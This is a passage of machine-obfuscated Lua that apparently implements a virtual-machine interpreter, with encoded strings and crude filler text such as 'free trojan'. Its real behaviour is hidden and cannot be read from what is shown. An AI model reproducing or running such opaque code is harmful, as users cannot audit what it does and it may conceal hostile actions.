a=(3976240)while(-#'This is working now'+(0x68/1))<i do a-= a if(l[e[c]]==e[C])then o=o+h;else o=e[k];end;break end while(a)/((0x112e-2237))==1840 do local e=e[x]l[e]=l[e]()break end;break;end while 996==(a)/((0x6a22/11))do a=(1476332)while i<=(-#"no thanks"+(0xea-138))do a-= a if l[e[c]]then o=o+n;else o=e[b];end;break;end while(a)/((0x2428/8))==1276 do a=(1178205)while(1056/0xc)<i do a-= a local o=e[r]local a={l[o](l[o+1])};local d=0;for e=o,e[C]do d=d+n;l[e]=a[d];end break end while(a)/((1524-0x315))==1603 do l[e[B]]=l[e[U]];break end;break;end break;end break;end break;end break;end while(a)/((3205-0x669))==1872 do a=(1125298)while i<=(0x214e/87)do a-= a a=(6106473)while i<=(0x4d04/212)do a-= a a=(5753825)while(((0x253e-4798)+-#'test')/52)>=i do a-= a a=(11297462)while i>(0x83+-41)do a-= a local o=e[w]l[o](u(l,o+h,e[b]))break end while 2959==(a)/((7659-0xf01))do local F;local T;local i;local S;local I;local K,v;local a;a=e[c]K,v=j(l[a](l[a+h]))N=v+a-n I=0;for e=a,N do I=I+n;l[e]=K[I];end;o=o+n;e=d[o];a=e[w]l[a](u(l,a+h,N))o=o+n;e=d[o];l[e[t]]=s[e[g]];o=o+n;e=d[o];l[e[t]]=e[O];o=o+n;e=d[o];a=e[x]l[a](l[a+h])o=o+n;e=d[o];a=e[t];S=l[e[b]];l[a+1]=S;l[a]=S[e[C]];o=o+n;e=d[o];l[e[t]]=l[e[k]][e[C]];o=o+n;e=d[o];l[e[c]]=s[e[k]];o=o+n;e=d[o];l[e[t]]=l[e[f]][e[p]];o=o+n;e=d[o];l[e[c]]=e[f];o=o+n;e=d[o];l[e[w]]=e[k];o=o+n;e=d[o];l[e[r]]=e[U];o=o+n;e=d[o];l[e[B]]=e[b];o=o+n;e=d[o];a=e[B]l[a]=l[a](u(l,a+n,e[f]))o=o+n;e=d[o];i={l,e};i[h][i[M][w]]=i[n][i[M][P]]+i[h][i[M][k]];o=o+n;e=d[o];a=e[r]l[a](u(l,a+h,e[O]))o=o+n;e=d[o];a=e[t];S=l[e[g]];l[a+1]=S;l[a]=S[e[_]];o=o+n;e=d[o];l[e[c]]=l[e[U]][e[p]];o=o+n;e=d[o];l[e[t]]=s[e[g]];o=o+n;e=d[o];l[e[B]]=l[e[f]][e[P]];o=o+n;e=d[o];l[e[w]]=e[b];o=o+n;e=d[o];l[e[w]]=e[b];o=o+n;e=d[o];l[e[t]]=e[U];o=o+n;e=d[o];l[e[t]]=e[b];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[f]))o=o+n;e=d[o];i={l,e};i[h][i[M][x]]=i[n][i[M][m]]+i[h][i[M][O]];o=o+n;e=d[o];a=e[c]l[a](u(l,a+h,e[g]))o=o+n;e=d[o];a=e[c];S=l[e[g]];l[a+1]=S;l[a]=S[e[D]];o=o+n;e=d[o];l[e[c]]=s[e[O]];o=o+n;e=d[o];l[e[r]]=l[e[k]][e[_]];o=o+n;e=d[o];l[e[c]]=e[O];o=o+n;e=d[o];l[e[w]]=e[U];o=o+n;e=d[o];l[e[r]]=e[f];o=o+n;e=d[o];l[e[w]]=e[f];o=o+n;e=d[o];a=e[B]K,v=j(l[a](u(l,a+1,e[U])))N=v+a-1 I=0;for e=a,N do I=I+n;l[e]=K[I];end;o=o+n;e=d[o];a=e[x]l[a](u(l,a+h,N))o=o+n;e=d[o];l[e[x]]=s[e[b]];o=o+n;e=d[o];l[e[B]]=e[O];o=o+n;e=d[o];a=e[c]l[a](l[a+h])o=o+n;e=d[o];l[e[w]][e[g]]=e[D];o=o+n;e=d[o];l[e[x]]=s[e[g]];o=o+n;e=d[o];l[e[x]]=e[g];o=o+n;e=d[o];a=e[c]l[a](l[a+h])o=o+n;e=d[o];l[e[r]]=e[g];o=o+n;e=d[o];l[e[c]]=e[f];o=o+n;e=d[o];l[e[r]]=e[U];o=o+n;e=d[o];a=e[B];T=l[a]F=l[a+2];if(F>0)then if(T>l[a+1])then o=e[k];else l[a+3]=T;end elseif(T<l[a+1])then o=e[f];else l[a+3]=T;end break end;break;end while(a)/((-#"test123"+(6827-0xd89)))==1715 do a=(3554310)while(257-0xa5)<i do a-= a local a;l[e[t]]=s[e[b]];o=o+n;e=d[o];l[e[x]]=l[e[k]][e[p]];o=o+n;e=d[o];l[e[w]]=l[e[g]][e[D]];o=o+n;e=d[o];l[e[x]]=e[g];o=o+n;e=d[o];l[e[x]]=s[e[O]];o=o+n;e=d[o];l[e[w]]=l[e[U]][e[_]];o=o+n;e=d[o];a=e[t]l[a](u(l,a+h,e[k]))o=o+n;e=d[o];l[e[x]]=s[e[b]];o=o+n;e=d[o];l[e[t]]=s[e[U]];o=o+n;e=d[o];l[e[x]]=l[e[k]][e[_]];break end while 2305==(a)/((0xc89-1667))do local r;local a;a=e[B];r=l[e[f]];l[a+1]=r;l[a]=r[e[p]];o=o+n;e=d[o];a=e[B]l[a](l[a+h])o=o+n;e=d[o];l[e[w]]=s[e[f]];o=o+n;e=d[o];l[e[t]]=e[O];o=o+n;e=d[o];a=e[w]l[a](l[a+h])o=o+n;e=d[o];if not l[e[w]]then o=o+h;else o=e[b];end;break end;break;end break;end while 1527==(a)/((8027-0xfbc))do a=(3588515)while i<=(0x4d3/13)do a-= a a=(2004912)while i>((-0x48fd/185)+195)do a-= a local i=K[e[b]];local r;local n={};r=A({},{__index=function(o,e)local e=n[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=n[e]e[1][e[2]]=o;end;});for a=1,e[C]do o=o+h;local e=d[o];if e[(174/0xae)]==88 then n[a-1]={l,e[O]};else n[a-1]={S,e[f]};end;T[#T+1]=n;end;l[e[x]]=v(i,r,s);break end while 952==(a)/((0x10dd-2211))do if not l[e[x]]then o=o+h;else o=e[b];end;break end;break;end while 3395==(a)/((2199-0x476))do a=(404482)while i<=((0x92+-31)+-#"I like gargling cum")do a-= a l[e[c]]=l[e[f]]%e[P];break;end while(a)/(((0x2e2+-114)+-#"me big peepee"))==662 do a=(1253826)while i>(304-0xcf)do a-= a l[e[B]][e[O]]=e[P];break end while(a)/((-0x24+((0x74f-987)+-#'free trojan')))==1498 do local e={l,e};e[h][e[M][t]]=e[n][e[M][C]]+e[h][e[M][O]];break end;break;end break;end break;end break;end while 1439==(a)/((26588/0x22))do a=(5064609)while((0x126-188)+-#[[test]])>=i do a-= a a=(1479408)while i<=(0x2d50/116)do a-= a a=(12307824)while(0x1fb6/82)<i do a-= a local o=e[w]local d,e=j(l[o](u(l,o+1,e[U])))N=e+o-1 local e=0;for o=o,N do e=e+n;l[o]=d[e];end;break end while 4038==(a)/((-65+0xc29))do local a;l[e[B]]=l[e[U]][e[p]];o=o+n;e=d[o];l[e[r]]=l[e[O]];o=o+n;e=d[o];l[e[w]]=l[e[U]][e[P]];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[b]))o=o+n;e=d[o];if not l[e[x]]then o=o+h;else o=e[g];end;break end;break;end while 3774==(a)/((13720/0x23))do a=(2922210)while(-#'This is working now'+(-21+(324-0xb7)))<i do a-= a o=e[k];break end while 790==(a)/((129465/0x23))do local a;l[e[r]][e[k]]=e[D];o=o+n;e=d[o];l[e[c]]=s[e[b]];o=o+n;e=d[o];l[e[c]]=l[e[U]][e[C]];o=o+n;e=d[o];l[e[B]]=e[b];o=o+n;e=d[o];l[e[x]]=e[O];o=o+n;e=d[o];l[e[r]]=e[k];o=o+n;e=d[o];l[e[x]]=e[O];o=o+n;e=d[o];a=e[B]l[a]=l[a](u(l,a+n,e[b]))o=o+n;e=d[o];l[e[r]][e[k]]=l[e[_]];o=o+n;e=d[o];l[e[x]]=s[e[b]];break end;break;end break;end while(a)/(((0x15e3-2830)+-#"187 ist die gang"))==1837 do a=(2857632)while i<=(-80+0xb8)do a-= a a=(14513699)while(-#[[This is working now]]+(0x14b-209))<i do a-= a local n=e[k];local o=l[n]for e=n+1,e[C]do o=o..l[e];end;l[e[w]]=o;break end while(a)/((7578-0xee9))==3859 do local e={l,e};e[h][e[M][c]]=e[n][e[M][D]]+e[h][e[M][f]];break end;break;end while(a)/(((949+-0x4a)+-#'test 123'))==3296 do a=(6715824)while i<=(0xee-133)do a-= a local o=e[c]l[o]=l[o](u(l,o+n,e[f]))break;end while 3092==(a)/(((0x8b5+-41)+-#[[187 ist die gang]]))do a=(1553068)while i>(133+-0x1b)do a-= a l[e[r]]=s[e[b]];break end while(a)/((-#[[test123]]+(0x3baea/162)))==1034 do local a;l[e[B]]=s[e[b]];o=o+n;e=d[o];a=e[x]l[a]=l[a]()o=o+n;e=d[o];l[e[x]]=l[e[f]][e[m]];o=o+n;e=d[o];l[e[w]][e[b]]=e[C];o=o+n;e=d[o];l[e[r]]=s[e[g]];o=o+n;e=d[o];a=e[t]l[a]=l[a]()o=o+n;e=d[o];l[e[r]]=l[e[k]][e[m]];o=o+n;e=d[o];l[e[r]]=s[e[O]];o=o+n;e=d[o];l[e[w]]=l[e[g]][e[P]];o=o+n;e=d[o];l[e[r]]=l[e[b]][e[C]];o=o+n;e=d[o];l[e[t]][e[U]]=l[e[m]];o=o+n;e=d[o];do return end;break end;break;end break;end break;end break;end break;end break;end while 3778==(a)/((0x174+-60))do a=(3817536)while(274-0x95)>=i do a-= a a=(2427508)while i<=(2204/0x13)do a-= a a=(731292)while i<=(333-0xde)do a-= a a=(7020783)while i<=(-0x7c+233)do a-= a a=(5605523)while(-#'no thanks'+(0x83a/18))<i do a-= a local a;local r;local i,k;local b;local a;a=e[c]l[a](l[a+h])o=o+n;e=d[o];l[e[t]]={};o=o+n;e=d[o];l[e[x]]=s[e[f]];o=o+n;e=d[o];a=e[x];b=l[e[f]];l[a+1]=b;l[a]=b[e[P]];o=o+n;e=d[o];a=e[t]i,k=j(l[a](l[a+h]))N=k+a-n r=0;for e=a,N do r=r+n;l[e]=i[r];end;o=o+n;e=d[o];a=e[c]i={l[a](u(l,a+1,N))};r=0;for e=a,e[_]do r=r+n;l[e]=i[r];end o=o+n;e=d[o];o=e[g];break end while 1693==(a)/((0x1a02-3347))do l[e[w]]=l[e[f]]-l[e[C]];break end;break;end while(a)/((-70+0xa33))==2763 do a=(560592)while((-0x74+348)+-122)<i do a-= a local e=e[w]l[e](l[e+h])break end while 2748==(a)/((0xa5c0/208))do l[e[c]]=e[f];break end;break;end break;end while(a)/((-#'Bong'+(0x3aa-525)))==1788 do a=(518638)while i<=(-#[[This is working now]]+(0xd5+-81))do a-= a a=(4827342)while((((-0x7a+14)+-#[[187 ist die gang]])+0xfc)+-#"187 ist die gang")<i do a-= a l[e[w]][l[e[g]]]=l[e[D]];break end while(a)/((-91+0x1026))==1194 do do return l[e[r]]end break end;break;end while(a)/((0x6ccc/66))==1229 do a=(9616134)while i<=(6840/0x3c)do a-= a local c;local i;local a;l[e[x]]=e[g];o=o+n;e=d[o];l[e[w]]=e[k];o=o+n;e=d[o];l[e[t]]=#l[e[U]];o=o+n;e=d[o];l[e[r]]=e[b];o=o+n;e=d[o];a=e[r];i=l[a]c=l[a+2];if(c>0)then if(i>l[a+1])then o=e[k];else l[a+3]=i;end elseif(i<l[a+1])then o=e[b];else l[a+3]=i;end break;end while(a)/((352536/(348-0xc8)))==4037 do a=(1070356)while(0x129-182)<i do a-= a if(l[e[c]]==e[_])then o=o+h;else o=e[k];end;break end while 508==(a)/((-88+(4414-0x8ab)))do local a;l[e[w]]=l[e[b]];o=o+n;e=d[o];l[e[t]]=l[e[f]];o=o+n;e=d[o];l[e[t]]=e[f];o=o+n;e=d[o];l[e[w]]=e[g];o=o+n;e=d[o];a=e[r]l[a]=l[a](u(l,a+n,e[k]))o=o+n;e=d[o];l[e[c]]=l[e[U]];o=o+n;e=d[o];l[e[w]]=e[g];o=o+n;e=d[o];a=e[r]l[a]=l[a](u(l,a+n,e[O]))o=o+n;e=d[o];if not l[e[r]]then o=o+h;else o=e[g];end;break end;break;end break;end break;end break;end while 596==(a)/((4136+-0x3f))do a=(5218647)while i<=(0x3930/122)do a-= a a=(1786126)while(354/0x3)>=i do a-= a a=(11581488)while i>(((-0x3d+-26)+-#"test")+0xd0)do a-= a S[e[b]]=l[e[w]];break end while(a)/((0xcba+-104))==3672 do local a;local i;local c,O;local k;local a;l[e[x]]=S[e[f]];o=o+n;e=d[o];a=e[w];k=l[e[b]];l[a+1]=k;l[a]=k[e[_]];o=o+n;e=d[o];a=e[r]c,O=j(l[a](l[a+h]))N=O+a-n i=0;for e=a,N do i=i+n;l[e]=c[i];end;o=o+n;e=d[o];a=e[t]c={l[a](u(l,a+1,N))};i=0;for e=a,e[m]do i=i+n;l[e]=c[i];end o=o+n;e=d[o];o=e[U];break end;break;end while(a)/(((1364-(0x5ec-782))+-#[[187 ist die gang]]))==2909 do a=(3267198)while((298-0xa6)+-#"amena jumping")<i do a-= a local r=K[e[U]];local a;local n={};a=A({},{__index=function(o,e)local e=n[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=n[e]e[1][e[2]]=o;end;});for a=1,e[_]do o=o+h;local e=d[o];if e[(59+-0x3a)]==88 then n[a-1]={l,e[g]};else n[a-1]={S,e[g]};end;T[#T+1]=n;end;l[e[B]]=v(r,a,s);break end while 1138==(a)/((2892+-0x15))do local d=e[r]local a={l[d](u(l,d+1,N))};local o=0;for e=d,e[_]do o=o+n;l[e]=a[o];end break end;break;end break;end while(a)/(((-#[[test 123]]+(60390/0x1e))+-0x6c))==2751 do a=(9080568)while(349-0xe3)>=i do a-= a a=(1188000)while i>(-0x7c+(564-0x13f))do a-= a l[e[w]]=#l[e[U]];break end while 594==(a)/((0x83f+-111))do local n=e[w];local a=l[n+2];local d=l[n]+a;l[n]=d;if(a>0)then if(d<=l[n+1])then o=e[b];l[n+3]=d;end elseif(d>=l[n+1])then o=e[k];l[n+3]=d;end break end;break;end while 3612==(a)/((5047-0x9e5))do a=(15348960)while(0x4dd6/162)>=i do a-= a local i;local a;l[e[r]]=s[e[b]];o=o+n;e=d[o];l[e[x]]=l[e[g]][e[C]];o=o+n;e=d[o];l[e[r]]=e[g];o=o+n;e=d[o];l[e[c]]=S[e[f]];o=o+n;e=d[o];a=e[t]l[a]=l[a](u(l,a+n,e[k]))o=o+n;e=d[o];l[e[t]]=s[e[k]];o=o+n;e=d[o];l[e[r]]=l[e[g]][e[m]];o=o+n;e=d[o];l[e[c]]=l[e[O]][e[D]];o=o+n;e=d[o];a=e[c];i=l[e[f]];l[a+1]=i;l[a]=i[e[C]];break;end while 3960==(a)/((0xf75+-81))do a=(3966768)while(0x28b0/84)<i do a-= a local o=e[B]l[o]=l[o](u(l,o+n,e[k]))break end while 1304==(a)/((-#'test'+(0x17f7-3089)))do s[e[b]]=l[e[r]];o=o+n;e=d[o];l[e[r]]={};o=o+n;e=d[o];l[e[t]]={};o=o+n;e=d[o];s[e[O]]=l[e[x]];o=o+n;e=d[o];l[e[B]]=s[e[k]];o=o+n;e=d[o];if(l[e[c]]==e[_])then o=o+h;else o=e[g];end;break end;break;end break;end break;end break;end break;end while(a)/((1991-0x417))==4044 do a=(3751515)while(0x16d-231)>=i do a-= a a=(2128400)while i<=(27735/0xd7)do a-= a a=(2591850)while i<=(18923/(243+-0x5e))do a-= a a=(4156022)while i>(-#'me big peepee'+(-55+0xc2))do a-= a if(e[r]<l[e[D]])then o=e[b];else o=o+h;end;break end while 1222==(a)/((3431+-0x1e))do l[e[c]]={};break end;break;end while(a)/((0xb21+((-1258/0x25)+-#'amena jumping')))==925 do a=(2138256)while(-#'no thanks'+(321-0xb8))<i do a-= a if l[e[w]]then o=o+n;else o=e[k];end;break end while 1116==(a)/(((-0x2b+-29)+1988))do local n=e[b];local o=l[n]for e=n+1,e[D]do o=o..l[e];end;l[e[c]]=o;break end;break;end break;end while(a)/((0xe718/87))==3130 do a=(5788715)while i<=((0x126-155)+-#'test 123')do a-= a a=(937922)while((-#'test123'+(0x3fd2+-81))/125)<i do a-= a local o=e[c];local n=l[e[g]];l[o+1]=n;l[o]=n[e[D]];break end while(a)/((1207-0x28d))==1693 do s[e[O]]=l[e[r]];break end;break;end while(a)/((0x1bbbf/47))==2395 do a=(9907056)while i<=(-0x6b+239)do a-= a local a=e[x];local n={};for e=1,#T do local e=T[e];for o=0,#e do local o=e[o];local d=o[1];local e=o[2];if d==l and e>=a then n[e]=d[e];o[1]=n;end;end;end;break;end while(a)/((-0x7f+3034))==3408 do a=(3894887)while i>(0x16e-233)do a-= a local a;local r;local i,U;local c;local a;a=e[B]l[a](l[a+h])o=o+n;e=d[o];l[e[B]][e[O]]=l[e[C]];o=o+n;e=d[o];l[e[x]]=s[e[b]];o=o+n;e=d[o];a=e[t];c=l[e[k]];l[a+1]=c;l[a]=c[e[C]];o=o+n;e=d[o];a=e[w]i,U=j(l[a](l[a+h]))N=U+a-n r=0;for e=a,N do r=r+n;l[e]=i[r];end;o=o+n;e=d[o];a=e[x]i={l[a](u(l,a+1,N))};r=0;for e=a,e[D]do r=r+n;l[e]=i[r];end o=o+n;e=d[o];o=e[k];break end while 1163==(a)/((-#'free trojan'+(0x1a82-3426)))do if(l[e[r]]~=l[e[P]])then o=o+h;else o=e[O];end;break end;break;end break;end break;end break;end while 1413==(a)/(((0x158b2/33)+-#'I like gargling cum'))do a=(1148496)while((3476/0x16)+-#'I like gargling cum')>=i do a-= a a=(2408648)while(0x880/16)>=i do a-= a a=(3391848)while i>(-0x1b+162)do a-= a local o=e[w]l[o](u(l,o+h,e[f]))break end while 1476==(a)/(((-#'I like gargling cum'+(0x1286-2408))+-0x11))do local r;local a;l[e[c]]=l[e[b]][e[P]];o=o+n;e=d[o];l[e[c]]=e[f];o=o+n;e=d[o];l[e[t]]=l[e[k]];o=o+n;e=d[o];a=e[w]l[a]=l[a](u(l,a+n,e[f]))o=o+n;e=d[o];l[e[x]]=l[e[k]][e[m]];o=o+n;e=d[o];a=e[c];r=l[e[O]];l[a+1]=r;l[a]=r[e[P]];break end;break;end while(a)/((-#[[amena jumping]]+(0x3ac+-119)))==2981 do a=(1986976)while(-105+0xf2)>=i do a-= a S[e[b]]=l[e[B]];break;end while 4006==(a)/((526+-0x1e))do a=(3785120)while((0x8c40/176)+-0x42)<i do a-= a local a;local i;local k,U;local t;local a;l[e[r]]=s[e[b]];o=o+n;e=d[o];a=e[c];t=l[e[O]];l[a+1]=t;l[a]=t[e[D]];o=o+n;e=d[o];a=e[w]k,U=j(l[a](l[a+h]))N=U+a-n i=0;for e=a,N do i=i+n;l[e]=k[i];end;o=o+n;e=d[o];a=e[x]k={l[a](u(l,a+1,N))};i=0;for e=a,e[m]do i=i+n;l[e]=k[i];end o=o+n;e=d[o];o=e[f];break end while 3280==(a)/((0x4d6+-84))do local i;local a;l[e[B]]=e[O];o=o+n;e=d[o];a=e[r]l[a]=l[a](u(l,a+n,e[k]))o=o+n;e=d[o];a=e[B];i=l[e[g]];l[a+1]=i;l[a]=i[e[p]];o=o+n;e=d[o];l[e[B]]=e[U];o=o+n;e=d[o];a=e[t]l[a]=l[a](u(l,a+n,e[b]))o=o+n;e=d[o];if not l[e[w]]then o=o+h;else o=e[k];end;break end;break;end break;end break;end while 284==(a)/((8168-0x101c))do a=(9782106)while(-#"test123"+(-0x22+182))>=i do a-= a a=(4240266)while i>(388-0xf8)do a-= a local a;l[e[x]]=e[O];o=o+n;e=d[o];l[e[t]]=e[b];o=o+n;e=d[o];a=e[w]l[a]=l[a](u(l,a+n,e[f]))o=o+n;e=d[o];l[e[t]][e[g]]=l[e[C]];o=o+n;e=d[o];l[e[r]][e[O]]=e[P];o=o+n;e=d[o];l[e[w]][e[f]]=e[_];o=o+n;e=d[o];l[e[B]][e[b]]=e[D];o=o+n;e=d[o];l[e[x]][e[f]]=e[p];o=o+n;e=d[o];l[e[t]][e[k]]=e[C];o=o+n;e=d[o];l[e[B]][e[g]]=l[e[C]];o=o+n;e=d[o];l[e[t]]=s[e[O]];o=o+n;e=d[o];l[e[w]]=l[e[U]][e[D]];o=o+n;e=d[o];l[e[c]]=e[g];o=o+n;e=d[o];l[e[B]]=e[f];o=o+n;e=d[o];l[e[c]]=e[g];o=o+n;e=d[o];a=e[c]l[a]=l[a](u(l,a+n,e[b]))o=o+n;e=d[o];l[e[B]][e[f]]=l[e[D]];o=o+n;e=d[o];l[e[c]][e[g]]=e[m];o=o+n;e=d[o];l[e[r]]=s[e[U]];o=o+n;e=d[o];l[e[r]]=l[e[U]][e[_]];o=o+n;e=d[o];l[e[x]]=e[k];o=o+n;e=d[o];l[e[r]]=e[U];o=o+n;e=d[o];l[e[w]]=e[b];o=o+n;e=d[o];l[e[r]]=e[f];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[U]))o=o+n;e=d[o];l[e[w]][e[g]]=l[e[C]];o=o+n;e=d[o];l[e[B]]=s[e[O]];o=o+n;e=d[o];l[e[t]]=l[e[U]][e[p]];o=o+n;e=d[o];l[e[c]]=e[b];o=o+n;e=d[o];l[e[x]]=e[U];o=o+n;e=d[o];l[e[x]]=e[b];o=o+n;e=d[o];l[e[w]]=e[U];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[O]))o=o+n;e=d[o];l[e[w]][e[k]]=l[e[p]];o=o+n;e=d[o];l[e[B]][e[k]]=e[D];o=o+n;e=d[o];l[e[t]][e[k]]=e[P];o=o+n;e=d[o];l[e[c]][e[b]]=l[e[D]];o=o+n;e=d[o];l[e[x]]=s[e[g]];o=o+n;e=d[o];l[e[c]]=l[e[f]][e[p]];o=o+n;e=d[o];l[e[x]]=e[k];o=o+n;e=d[o];l[e[r]]=e[f];o=o+n;e=d[o];l[e[r]]=e[b];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[k]))o=o+n;e=d[o];l[e[B]][e[k]]=l[e[p]];o=o+n;e=d[o];l[e[w]][e[k]]=e[m];o=o+n;e=d[o];l[e[c]][e[O]]=e[P];o=o+n;e=d[o];l[e[x]]=s[e[O]];o=o+n;e=d[o];l[e[r]]=l[e[g]][e[_]];o=o+n;e=d[o];l[e[r]]=e[f];o=o+n;e=d[o];l[e[w]]=e[f];o=o+n;e=d[o];l[e[w]]=e[f];o=o+n;e=d[o];l[e[c]]=e[U];o=o+n;e=d[o];a=e[t]l[a]=l[a](u(l,a+n,e[k]))o=o+n;e=d[o];l[e[r]][e[U]]=l[e[P]];o=o+n;e=d[o];l[e[B]]=s[e[g]];o=o+n;e=d[o];l[e[t]]=l[e[f]][e[D]];o=o+n;e=d[o];l[e[r]]=e[U];o=o+n;e=d[o];l[e[r]]=e[b];o=o+n;e=d[o];l[e[t]]=e[b];o=o+n;e=d[o];l[e[B]]=e[k];o=o+n;e=d[o];a=e[t]l[a]=l[a](u(l,a+n,e[O]))o=o+n;e=d[o];l[e[r]][e[g]]=l[e[_]];o=o+n;e=d[o];l[e[r]][e[g]]=e[P];o=o+n;e=d[o];l[e[r]]=s[e[O]];o=o+n;e=d[o];l[e[c]]=l[e[g]][e[P]];o=o+n;e=d[o];l[e[t]]=l[e[O]][e[C]];o=o+n;e=d[o];l[e[x]][e[g]]=l[e[p]];o=o+n;e=d[o];l[e[t]][e[U]]=e[D];o=o+n;e=d[o];l[e[t]]=s[e[f]];o=o+n;e=d[o];l[e[x]]=l[e[f]][e[_]];o=o+n;e=d[o];l[e[c]]=e[b];o=o+n;e=d[o];l[e[x]]=e[f];o=o+n;e=d[o];l[e[r]]=e[U];o=o+n;e=d[o];a=e[w]l[a]=l[a](u(l,a+n,e[k]))o=o+n;e=d[o];l[e[r]][e[b]]=l[e[P]];o=o+n;e=d[o];l[e[c]][e[b]]=e[_];o=o+n;e=d[o];l[e[r]][e[U]]=e[m];o=o+n;e=d[o];l[e[t]][e[k]]=e[D];o=o+n;e=d[o];l[e[B]][e[b]]=e[_];o=o+n;e=d[o];l[e[x]][e[k]]=l[e[P]];break end while 1538==(a)/((5621-0xb30))do l[e[r]][e[O]]=l[e[m]];break end;break;end while(a)/((3345+-0x26))==2958 do a=(4531024)while i<=(-79+(461-0xf0))do a-= a l[e[c]]=l[e[O]][l[e[m]]];break;end while 2012==(a)/((-#[[amena jumping]]+(4578-0x909)))do a=(5842304)while((-0x13+178)+-#'187 ist die gang')<i do a-= a local i;local a;s[e[k]]=l[e[x]];o=o+n;e=d[o];l[e[x]]=s[e[f]];o=o+n;e=d[o];l[e[c]]=l[e[g]][e[C]];o=o+n;e=d[o];l[e[w]]=e[O];o=o+n;e=d[o];a=e[x]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[c]]=s[e[O]];o=o+n;e=d[o];l[e[w]]=l[e[U]][e[D]];o=o+n;e=d[o];l[e[r]]=e[g];o=o+n;e=d[o];a=e[t]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[r]]=s[e[O]];o=o+n;e=d[o];l[e[B]]=l[e[g]][e[D]];o=o+n;e=d[o];l[e[t]]=e[k];o=o+n;e=d[o];a=e[c]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[B]]=s[e[O]];o=o+n;e=d[o];l[e[B]]=l[e[g]][e[p]];o=o+n;e=d[o];l[e[t]]=e[f];o=o+n;e=d[o];a=e[x]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[t]]=s[e[k]];o=o+n;e=d[o];l[e[r]]=l[e[k]][e[C]];o=o+n;e=d[o];l[e[r]]=e[b];o=o+n;e=d[o];a=e[x]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[c]]=s[e[f]];o=o+n;e=d[o];l[e[t]]=l[e[f]][e[p]];o=o+n;e=d[o];l[e[w]]=e[g];o=o+n;e=d[o];a=e[w]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[t]]=s[e[k]];o=o+n;e=d[o];l[e[c]]=l[e[O]][e[D]];o=o+n;e=d[o];l[e[B]]=e[b];o=o+n;e=d[o];a=e[t]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[B]][e[b]]=e[D];o=o+n;e=d[o];l[e[t]][e[U]]=e[C];o=o+n;e=d[o];l[e[t]][e[k]]=e[P];o=o+n;e=d[o];l[e[t]][e[g]]=e[_];o=o+n;e=d[o];l[e[x]]=s[e[U]];o=o+n;e=d[o];l[e[x]][e[k]]=l[e[P]];o=o+n;e=d[o];a=e[c];i=l[e[b]];l[a+1]=i;l[a]=i[e[D]];o=o+n;e=d[o];a=e[r]l[a](l[a+h])o=o+n;e=d[o];l[e[x]][e[k]]=e[P];o=o+n;e=d[o];l[e[B]]=s[e[O]];o=o+n;e=d[o];l[e[t]]=l[e[f]][e[p]];o=o+n;e=d[o];l[e[t]]=l[e[k]][e[C]];o=o+n;e=d[o];a=e[c];i=l[e[U]];l[a+1]=i;l[a]=i[e[p]];o=o+n;e=d[o];l[e[c]]=e[f];o=o+n;e=d[o];a=e[c]l[a]=l[a](u(l,a+n,e[O]))o=o+n;e=d[o];l[e[t]][e[k]]=l[e[_]];o=o+n;e=d[o];l[e[r]][e[f]]=e[p];o=o+n;e=d[o];l[e[t]][e[U]]=l[e[P]];o=o+n;e=d[o];l[e[c]]=s[e[k]];o=o+n;e=d[o];l[e[t]]=l[e[b]][e[P]];o=o+n;e=d[o];l[e[x]]=e[g];o=o+n;e=d[o];l[e[B]]=e[U];o=o+n;e=d[o];l[e[t]]=e[U];o=o+n;e=d[o];a=e[t]l[a]=l[a](u(l,a+n,e[g]))o=o+n;e=d[o];l[e[c]][e[U]]=l[e[D]];o=o+n;e=d[o];l[e[c]][e[g]]=e[_];o=o+n;e=d[o];l[e[c]][e[O]]=e[P];o=o+n;e=d[o];l[e[x]]=s[e[O]];o=o+n;e=d[o];l[e[t]]=l[e[k]][e[P]];o=o+n;e=d[o];l[e[w]]=e[k];o=o+n;e=d[o];l[e[c]]=e[g];o=o+n;e=d[o];l[e[r]]=e[f];o=o+n;e=d[o];l[e[B]]=e[U];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[f]))o=o+n;e=d[o];l[e[x]][e[O]]=l[e[_]];o=o+n;e=d[o];l[e[c]]=s[e[U]];o=o+n;e=d[o];l[e[t]]=l[e[g]][e[P]];o=o+n;e=d[o];l[e[r]]=e[k];o=o+n;e=d[o];l[e[w]]=e[b];o=o+n;e=d[o];l[e[x]]=e[O];o=o+n;e=d[o];l[e[c]]=e[g];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[U]))o=o+n;e=d[o];l[e[B]][e[U]]=l[e[_]];o=o+n;e=d[o];l[e[c]][e[O]]=e[P];o=o+n;e=d[o];l[e[r]]=s[e[U]];o=o+n;e=d[o];l[e[r]]=l[e[k]][e[m]];o=o+n;e=d[o];l[e[t]]=l[e[g]][e[p]];o=o+n;e=d[o];l[e[r]][e[O]]=l[e[P]];o=o+n;e=d[o];l[e[B]][e[U]]=e[P];o=o+n;e=d[o];l[e[r]]=s[e[U]];o=o+n;e=d[o];l[e[w]]=l[e[b]][e[m]];break end while(a)/((3367-0x6a7))==3511 do l[e[B]]=l[e[f]][e[m]];break end;break;end break;end break;end break;end break;end break;end break;end o+= h end;end);end;return v(H(),{},Q())()end)_msec({[((246+-0x7e)+-#[[test123]])]='\115\116'..(function(e)return(e and'ككسزكسضسكؠحئئكز')or'\114\105'or'\120\58'end)((100-0x5f)==(0xa8/28))..'\110g',["زجددؠ؃سن؃ضزټز؃ضس"]='\108\100'..(function(e)return(e and'؃آ؃نضئئڪنز')or'\101\120'or'\119\111'end)((106-0x65)==(0x3d-55))..'\112',["ڝضقؠس؃حضآنز؃دزسقض"]=(function(e)return(e and'حزسجسقټآ')and'\98\121'or'\100\120'end)(((-#[[187 ist die 